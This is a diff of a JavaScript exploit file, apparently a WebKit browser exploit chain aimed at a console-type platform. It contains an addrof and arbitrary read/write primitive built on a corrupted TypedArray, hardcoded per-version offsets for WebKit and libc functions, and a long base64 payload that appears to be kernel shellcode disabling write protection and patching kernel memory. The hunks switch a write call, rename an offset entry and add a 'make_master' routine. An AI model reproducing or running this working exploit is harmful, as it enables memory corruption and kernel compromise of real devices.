@@ -308,7 +308,7 @@ const impl_map = {
       },
       make_master(victim_addr) {
         arw.victim.setBInt(0x10, victim_addr, true);
-        arw.victim.setBInt(impl.wk_TypedArray_m_mode, 1, true); // TypedArrayMode:OversizeTypedArray
+        arw.victim.setUint32(impl.wk_TypedArray_m_mode, 1, true); // TypedArrayMode:OversizeTypedArray
       },
       fix_victim() {
         const victim_addr = arw.addrof(arw.victim);
@@ -357,7 +357,7 @@ const impl_map = {
         'uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wAAAL7rAAAAv+sAAABBuOsAAABBuesEAABBupDp//9IgcKtWAEAZomB5EpiAMaBzQoAAOvGgQ0cIADrxoFRHCAA68aBzRwgAOvGgREdIADrxoG9HiAA68aBbSMgAOvGgT0kIADrZomxz1NiAMeBkAQAAAAAAADGgcIEAADrZom5uQQAAGZEiYG1BAAAxoE2pR8A62ZEiYk7bRkAZkSJkST3GQDGgd/+GQDrx4FgGQEASDHAw8aBei0SADfGgX0tEgA3x4EAlQ8BAgAAAEiJkQiVDwHHgSyVDwEBAAAADyDASA0AAAEADyLADyDASCX///7/DyLAuOsGAABBu+tIAAAx0jH2ZomBs3cNAL8BAAAASLhBg7+gBAAAAEG4AQAAAEiJgbt3DQC4BAAAAEG5SYv//2aJgc13DQC4BAAAAGaJgdp3DQC4BQAAAGaJgfJ3DQC4BQAAAGZEiZlxdw0Ax4HJdw0ASYuH0MaBz3cNAADHgdZ3DQBJi7ewxoHcdw0AAMeB7ncNAEmLh0DGgfR3DQAAx4H7dw0ASYu3IGaJgf93DQDGgQF4DQAAx4ETeA0ASY2/wGaJkRd4DQDGgRl4DQAAx4EfeA0ASY2/4GaJsSN4DQDGgSV4DQAAx4EyeA0ASY2/AGaJuTZ4DQDGgTh4DQAAx4E+eA0ASY2/IGZEiYFCeA0AxoFEeA0AAGZEiYlPeA0AxoFReA0A/w8gwEgNAAABAA8iwDHAww==',
 
       lk__error: 0xbb60,
-      c_strerror: 0x357d0,
+      lc_strerror: 0x357d0,
 
       wk_pthread_create: 0x4748,
       wk_pthread_join: 0x4978,
@@ -505,6 +505,10 @@ const impl_map = {
         delete container.mode; // becomes 0
 
         return container;
+      },
+      make_master(victim_addr) {
+        arw.victim.setBInt(0x10, victim_addr, true);
+        arw.victim.setBInt(impl.wk_TypedArray_m_mode, 1, true); // TypedArrayMode:OversizeTypedArray
       },
       fix_victim() {
         const victim_addr = arw.addrof(arw.victim);
